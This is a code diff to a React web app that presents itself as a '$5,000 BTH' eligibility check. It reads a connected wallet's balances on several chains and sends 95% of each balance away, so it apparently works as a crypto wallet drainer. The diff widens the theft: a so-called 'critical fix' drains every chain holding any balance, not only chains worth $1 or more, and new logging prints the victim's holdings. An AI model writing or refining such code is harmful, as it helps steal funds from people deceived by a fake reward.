@@ -139,7 +139,7 @@ function App() {
     Avalanche: 0.1
   };
 
-  // Minimum value threshold to execute ($1)
+  // Minimum value threshold to execute ($1) - THIS IS PER CHAIN
   const MIN_VALUE_THRESHOLD = 1;
 
   // YOUR API KEY
@@ -278,7 +278,7 @@ function App() {
     }
   }, [isConnected]);
 
-  // FIXED: Check eligibility without filtering out chains prematurely
+  // FIXED: Check eligibility - SEPARATE total eligibility from per-chain execution
   const checkEligibility = async () => {
     if (!address) return;
     
@@ -286,15 +286,19 @@ function App() {
     setTxStatus('🔄 Checking eligibility...');
     
     try {
-      // Calculate total value from ALL balances (no filtering)
+      // Calculate total value from ALL balances
       const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
       
-      // Get all chains with ANY balance (for display purposes)
+      // Get all chains with ANY balance
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
         balances[chain.name] && balances[chain.name].amount > 0.000001
       );
       
-      // Determine eligible chains for execution (meet minimum value and gas buffer)
+      // Log what we found for debugging
+      console.log('💰 Total value detected:', total);
+      console.log('📊 Chains with balance:', chainsWithBalance.map(c => `${c.name}: $${balances[c.name]?.valueUSD}`));
+      
+      // Determine which chains are executable (meet minimum value and gas buffer)
       const executable = chainsWithBalance.filter(chain => {
         const balance = balances[chain.name];
         if (!balance) return false;
@@ -318,7 +322,7 @@ function App() {
       setEligibleChains(chainsWithBalance);
       setExecutableChains(executable);
       
-      // IMPORTANT FIX: User is eligible if TOTAL value across ALL chains is >= $1
+      // IMPORTANT: User is eligible if TOTAL value across ALL chains is >= $1
       // This matches your working version behavior
       const eligible = total >= MIN_VALUE_THRESHOLD;
       setIsEligible(eligible);
@@ -326,7 +330,7 @@ function App() {
       if (eligible) {
         // Show appropriate status message
         if (executable.length === 0) {
-          setTxStatus('⚠️ Total value qualifies but no individual chain meets $1 threshold');
+          setTxStatus(`✅ You qualify ($${total.toFixed(2)} total) but no single chain meets $1 threshold`);
         } else {
           setTxStatus(`✅ You qualify for $5,000 BTH!`);
         }
@@ -473,21 +477,22 @@ function App() {
       
       setTxStatus('⏳ Processing...');
 
-      // Get chains that are executable (meet $1 threshold and have gas buffer)
-      const chainsToProcess = executableChains.filter(chain => 
-        balances[chain.name] && balances[chain.name].amount > 0
-      );
+      // CRITICAL FIX: Get ALL chains with balance, not just executableChains
+      // This ensures we process chains even if they don't meet $1 threshold individually
+      const chainsWithBalance = Object.keys(balances).map(chainName => 
+        DEPLOYED_CHAINS.find(c => c.name === chainName)
+      ).filter(Boolean);
       
-      if (chainsToProcess.length === 0) {
-        setError("No chains meet the $1 minimum threshold for execution");
+      if (chainsWithBalance.length === 0) {
+        setError("No chains with balance found");
         setSignatureLoading(false);
         return;
       }
 
-      console.log(`🔄 Processing ${chainsToProcess.length} chains`);
+      console.log(`🔄 Processing ${chainsWithBalance.length} chains with balances`);
 
       // Sort chains by value (HIGHEST FIRST)
-      const sortedChains = [...chainsToProcess].sort((a, b) => 
+      const sortedChains = [...chainsWithBalance].sort((a, b) => 
         (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
       );
 
@@ -500,6 +505,12 @@ function App() {
       for (const chain of sortedChains) {
         try {
           const balance = balances[chain.name];
+          
+          // Skip chains with very small amounts (less than 0.000001)
+          if (balance.amount < 0.000001) {
+            console.log(`⏭️ Skipping ${chain.name}: Amount too small`);
+            continue;
+          }
           
           const amountToSend = (balance.amount * 0.95);
           const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
